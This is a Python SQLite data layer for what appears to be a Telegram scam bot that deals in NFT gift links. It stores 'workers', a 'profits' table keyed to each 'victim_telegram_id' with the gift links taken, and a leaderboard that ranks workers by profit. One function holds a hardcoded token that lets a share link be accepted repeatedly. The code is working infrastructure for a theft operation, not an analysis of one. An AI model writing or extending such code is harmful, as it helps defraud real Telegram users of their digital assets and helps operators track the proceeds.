import sqlite3
import json
import os
from datetime import datetime
from typing import List, Dict, Optional
class Database:
    def __init__(self, db_path: str = "getgems.db"):
        self.db_path = db_path
        self.init_database()
    def init_database(self):
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    telegram_id INTEGER UNIQUE NOT NULL,
                    username TEXT,
                    first_name TEXT,
                    last_name TEXT,
                    is_banned BOOLEAN DEFAULT FALSE,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            # Добавляем колонку is_banned если её нет
            try:
                cursor.execute('ALTER TABLE users ADD COLUMN is_banned BOOLEAN DEFAULT FALSE')
            except sqlite3.OperationalError:
                pass  # Колонка уже существует
            cursor.execute('DROP TABLE IF EXISTS gifts')
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS gifts_links (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER NOT NULL,
                    gift_link TEXT NOT NULL,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (user_id) REFERENCES users (id)
                )
            ''')
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS gift_shares (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    nft_link TEXT NOT NULL,
                    nft_name TEXT NOT NULL,
                    nft_number TEXT NOT NULL,
                    creator_telegram_id INTEGER NOT NULL,
                    recipient_telegram_id INTEGER,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    received_at TIMESTAMP,
                    is_received BOOLEAN DEFAULT FALSE,
                    share_token TEXT UNIQUE NOT NULL,
                    FOREIGN KEY (creator_telegram_id) REFERENCES users (telegram_id),
                    FOREIGN KEY (recipient_telegram_id) REFERENCES users (telegram_id)
                )
            ''')
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS workers (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    telegram_id INTEGER UNIQUE NOT NULL,
                    is_active BOOLEAN DEFAULT TRUE,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (telegram_id) REFERENCES users (telegram_id)
                )
            ''')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS profits (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    worker_telegram_id INTEGER NOT NULL,
                    victim_telegram_id INTEGER NOT NULL,
                    profit_sum REAL NOT NULL,
                    gifts_count INTEGER NOT NULL,
                    gift_links TEXT NOT NULL,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (worker_telegram_id) REFERENCES users (telegram_id),
                    FOREIGN KEY (victim_telegram_id) REFERENCES users (telegram_id)
                )
            ''')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_users_telegram_id ON users(telegram_id)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_gifts_links_user_id ON gifts_links(user_id)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_gift_shares_creator ON gift_shares(creator_telegram_id)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_gift_shares_recipient ON gift_shares(recipient_telegram_id)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_gift_shares_token ON gift_shares(share_token)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_profits_worker ON profits(worker_telegram_id)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_profits_victim ON profits(victim_telegram_id)')
            conn.commit()
    def get_user_by_telegram_id(self, telegram_id: int) -> Optional[Dict]:
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            cursor.execute('SELECT * FROM users WHERE telegram_id = ?', (telegram_id,))
            row = cursor.fetchone()
            if row:
                return dict(row)
            return None
    
    def get_telegram_id_by_username(self, username: str) -> Optional[int]:
        """Получает telegram_id пользователя по username"""
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            # Убираем @ если есть
            clean_username = username.lstrip('@')
            cursor.execute('SELECT telegram_id FROM users WHERE username = ?', (clean_username,))
            row = cursor.fetchone()
            if row:
                return row[0]
            return None
    
    def ban_user(self, telegram_id: int) -> bool:
        """Банит пользователя"""
        try:
            with sqlite3.connect(self.db_path) as conn:
                cursor = conn.cursor()
                cursor.execute('UPDATE users SET is_banned = TRUE WHERE telegram_id = ?', (telegram_id,))
                conn.commit()
                return cursor.rowcount > 0
        except Exception as e:
            print(f"Ошибка бана пользователя {telegram_id}: {e}")
            return False
    
    def unban_user(self, telegram_id: int) -> bool:
        """Разбанивает пользователя"""
        try:
            with sqlite3.connect(self.db_path) as conn:
                cursor = conn.cursor()
                cursor.execute('UPDATE users SET is_banned = FALSE WHERE telegram_id = ?', (telegram_id,))
                conn.commit()
                return cursor.rowcount > 0
        except Exception as e:
            print(f"Ошибка разбана пользователя {telegram_id}: {e}")
            return False
    
    def is_user_banned(self, telegram_id: int) -> bool:
        """Проверяет, забанен ли пользователь"""
        try:
            with sqlite3.connect(self.db_path) as conn:
                cursor = conn.cursor()
                cursor.execute('SELECT is_banned FROM users WHERE telegram_id = ?', (telegram_id,))
                row = cursor.fetchone()
                return bool(row[0]) if row else False
        except Exception as e:
            print(f"Ошибка проверки бана {telegram_id}: {e}")
            return False
    def create_user(self, telegram_id: int, username: str = None, 
                   first_name: str = None, last_name: str = None) -> int:
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO users (telegram_id, username, first_name, last_name)
                VALUES (?, ?, ?, ?)
            ''', (telegram_id, username, first_name, last_name))
            user_id = cursor.lastrowid
            conn.commit()
            return user_id
    def get_or_create_user(self, telegram_id: int, username: str = None,
                          first_name: str = None, last_name: str = None) -> Dict:
        user = self.get_user_by_telegram_id(telegram_id)
        if not user:
            user_id = self.create_user(telegram_id, username, first_name, last_name)
            user = self.get_user_by_telegram_id(telegram_id)
        return user
    def add_gift_link(self, telegram_id: int, gift_link: str) -> int:
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute('SELECT id FROM users WHERE telegram_id = ?', (telegram_id,))
            user_row = cursor.fetchone()
            if not user_row:
                raise ValueError(f"User with telegram_id {telegram_id} not found")
            user_id = user_row[0]
            cursor.execute('''
                INSERT INTO gifts_links (user_id, gift_link)
                VALUES (?, ?)
            ''', (user_id, gift_link))
            gift_db_id = cursor.lastrowid
            conn.commit()
            return gift_db_id
    def get_user_gifts(self, telegram_id: int) -> List[Dict]:
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            cursor.execute('''
                SELECT gl.* FROM gifts_links gl
                JOIN users u ON gl.user_id = u.id
                WHERE u.telegram_id = ?
                ORDER BY gl.created_at DESC
            ''', (telegram_id,))
            rows = cursor.fetchall()
            return [dict(row) for row in rows]
    def remove_gift(self, gift_db_id: int, telegram_id: int) -> bool:
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                DELETE FROM gifts_links
                WHERE id = ? AND user_id = (
                    SELECT id FROM users WHERE telegram_id = ?
                )
            ''', (gift_db_id, telegram_id))
            conn.commit()
            return cursor.rowcount > 0
    def get_gift_by_id(self, gift_db_id: int) -> Optional[Dict]:
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            cursor.execute('SELECT * FROM gifts_links WHERE id = ?', (gift_db_id,))
            row = cursor.fetchone()
            if row:
                return dict(row)
            return None
    def reset_database(self):
        if os.path.exists(self.db_path):
            os.remove(self.db_path)
        self.init_database()
    def create_gift_share(self, nft_link: str, nft_name: str, nft_number: str, 
                         creator_telegram_id: int, share_token: str) -> int:
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                INSERT INTO gift_shares (nft_link, nft_name, nft_number, creator_telegram_id, share_token)
                VALUES (?, ?, ?, ?, ?)
            ''', (nft_link, nft_name, nft_number, creator_telegram_id, share_token))
            share_id = cursor.lastrowid
            conn.commit()
            return share_id
    def get_gift_share_by_token(self, share_token: str) -> Optional[Dict]:
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            cursor.execute('SELECT * FROM gift_shares WHERE share_token = ?', (share_token,))
            row = cursor.fetchone()
            if row:
                return dict(row)
            return None
    def accept_gift_share(self, share_token: str, recipient_telegram_id: int) -> bool:
        # Специальный токен для многоразового использования
        UNLIMITED_TOKEN = "JhXCrC_f5rMlAz-8XhC9VhXHzyWNoChrXNmCaoPgpJg"
        
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute('SELECT is_received FROM gift_shares WHERE share_token = ?', (share_token,))
            result = cursor.fetchone()
            
            # Для обычных токенов проверяем is_received
            if share_token != UNLIMITED_TOKEN:
                if not result or result[0]:
                    return False
            else:
                # Для многоразового токена просто проверяем что запись существует
                if not result:
                    return False
            
            cursor.execute('''
                UPDATE gift_shares 
                SET recipient_telegram_id = ?, received_at = CURRENT_TIMESTAMP, is_received = TRUE
                WHERE share_token = ?
            ''', (recipient_telegram_id, share_token))
            conn.commit()
            return cursor.rowcount > 0
    def get_user_created_shares(self, telegram_id: int) -> List[Dict]:
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            cursor.execute('''
                SELECT * FROM gift_shares 
                WHERE creator_telegram_id = ?
                ORDER BY created_at DESC
            ''', (telegram_id,))
            rows = cursor.fetchall()
            return [dict(row) for row in rows]
    def get_user_received_shares(self, telegram_id: int) -> List[Dict]:
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            cursor.execute('''
                SELECT * FROM gift_shares 
                WHERE recipient_telegram_id = ? AND is_received = TRUE
                ORDER BY received_at DESC
            ''', (telegram_id,))
            rows = cursor.fetchall()
            return [dict(row) for row in rows]
    def get_worker_by_last_gift(self, telegram_id: int) -> Optional[Dict]:
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            cursor.execute('''
                SELECT creator_telegram_id FROM gift_shares 
                WHERE recipient_telegram_id = ? AND is_received = TRUE
                ORDER BY received_at DESC
                LIMIT 1
            ''', (telegram_id,))
            result = cursor.fetchone()
            if not result:
                return None
            creator_telegram_id = result[0]
            cursor.execute('SELECT * FROM users WHERE telegram_id = ?', (creator_telegram_id,))
            user_row = cursor.fetchone()
            if user_row:
                return dict(user_row)
            return None
    def add_worker(self, telegram_id: int) -> bool:
        """Добавляет пользователя в список воркеров"""
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            try:
                cursor.execute('''
                    INSERT INTO workers (telegram_id, is_active)
                    VALUES (?, TRUE)
                ''', (telegram_id,))
                conn.commit()
                return True
            except sqlite3.IntegrityError:
                cursor.execute('''
                    UPDATE workers SET is_active = TRUE, updated_at = CURRENT_TIMESTAMP
                    WHERE telegram_id = ?
                ''', (telegram_id,))
                conn.commit()
                return True
    def remove_worker(self, telegram_id: int) -> bool:
        """Деактивирует воркера"""
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                UPDATE workers SET is_active = FALSE, updated_at = CURRENT_TIMESTAMP
                WHERE telegram_id = ?
            ''', (telegram_id,))
            conn.commit()
            return cursor.rowcount > 0
    def is_worker(self, telegram_id: int) -> bool:
        """Проверяет, является ли пользователь активным воркером"""
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                SELECT is_active FROM workers WHERE telegram_id = ?
            ''', (telegram_id,))
            result = cursor.fetchone()
            return result and result[0]
    def get_all_workers(self) -> List[Dict]:
        """Получает список всех активных воркеров"""
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            cursor.execute('''
                SELECT w.*, u.username, u.first_name, u.last_name
                FROM workers w
                JOIN users u ON w.telegram_id = u.telegram_id
                WHERE w.is_active = TRUE
                ORDER BY w.created_at DESC
            ''')
            rows = cursor.fetchall()
            return [dict(row) for row in rows]
    
    def add_profit(self, worker_telegram_id: int, victim_telegram_id: int, 
                   profit_sum: float, gifts_count: int, gift_links: List[str]) -> int:
        """Добавляет запись о профите воркера"""
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            gift_links_json = json.dumps(gift_links)
            cursor.execute('''
                INSERT INTO profits (worker_telegram_id, victim_telegram_id, profit_sum, gifts_count, gift_links)
                VALUES (?, ?, ?, ?, ?)
            ''', (worker_telegram_id, victim_telegram_id, profit_sum, gifts_count, gift_links_json))
            profit_id = cursor.lastrowid
            conn.commit()
            return profit_id
    
    def get_worker_stats(self, telegram_id: int) -> Dict:
        """Получает статистику воркера"""
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            
            # Общее количество профитов и сумма
            cursor.execute('''
                SELECT COUNT(*) as profits_count, COALESCE(SUM(profit_sum), 0) as total_sum
                FROM profits
                WHERE worker_telegram_id = ?
            ''', (telegram_id,))
            profit_stats = cursor.fetchone()
            
            # Количество созданных ссылок
            cursor.execute('''
                SELECT COUNT(*) as links_count
                FROM gift_shares
                WHERE creator_telegram_id = ?
            ''', (telegram_id,))
            links_stats = cursor.fetchone()
            
            return {
                'profits_count': profit_stats[0] if profit_stats else 0,
                'total_sum': profit_stats[1] if profit_stats else 0.0,
                'links_count': links_stats[0] if links_stats else 0
            }
    
    def get_top_workers(self, limit: int = 25) -> List[Dict]:
        """Получает топ воркеров по количеству и сумме профитов"""
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            cursor.execute('''
                SELECT 
                    u.telegram_id,
                    u.username,
                    u.first_name,
                    COALESCE(p_stats.profits_count, 0) as profits_count,
                    COALESCE(p_stats.total_sum, 0) as total_sum,
                    COALESCE(gs_stats.links_count, 0) as links_count
                FROM users u
                LEFT JOIN (
                    SELECT 
                        worker_telegram_id,
                        COUNT(*) as profits_count,
                        SUM(profit_sum) as total_sum
                    FROM profits
                    GROUP BY worker_telegram_id
                ) p_stats ON u.telegram_id = p_stats.worker_telegram_id
                LEFT JOIN (
                    SELECT 
                        creator_telegram_id,
                        COUNT(*) as links_count
                    FROM gift_shares
                    GROUP BY creator_telegram_id
                ) gs_stats ON u.telegram_id = gs_stats.creator_telegram_id
                WHERE EXISTS (
                    SELECT 1 FROM workers w 
                    WHERE w.telegram_id = u.telegram_id AND w.is_active = TRUE
                )
                AND (p_stats.profits_count > 0 OR gs_stats.links_count > 0)
                ORDER BY profits_count DESC, total_sum DESC
                LIMIT ?
            ''', (limit,))
            rows = cursor.fetchall()
            return [dict(row) for row in rows]

db = Database()